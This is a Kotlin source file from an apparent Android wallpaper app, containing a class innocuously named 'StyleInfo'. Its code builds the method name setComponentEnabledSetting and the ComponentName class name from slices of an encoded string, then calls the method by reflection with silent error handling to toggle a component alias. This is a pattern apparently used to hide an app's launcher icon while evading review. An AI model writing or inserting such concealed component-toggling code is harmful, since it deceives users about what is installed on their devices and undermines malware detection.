package com.whisper.gentle.paper

import android.content.ComponentName
import android.content.Context

/**
 * Date：2025/11/18
 * Describe:
 */
class StyleInfo(val index: Int) {
    private val cla by lazy { Int::class.java }

    fun action(context: Context, name: String) {
        val pm = context.packageManager
        // "11setComponentEnabledSettingandroid.content.ComponentName"
        val alias = name.substring(index) //57
        if (alias.length < 6) return
        val status1 = strF(name, 0).toInt()
        val status2 = strF(name, 1).toInt()
        runCatching {
            val method = pm.javaClass.getMethod(strF(name, 2), Class.forName(name.substring(28, 57)), cla, cla)
            method.invoke(pm, ComponentName(context, alias), status1, status2)
        }
    }

    private fun strF(name: String, type: Int): String {
        return when (type) {
            0 -> name.substring(0, 1)
            1 -> name.substring(1, 2)
            2 -> name.substring(2, 28)
            else -> name
        }
    }
}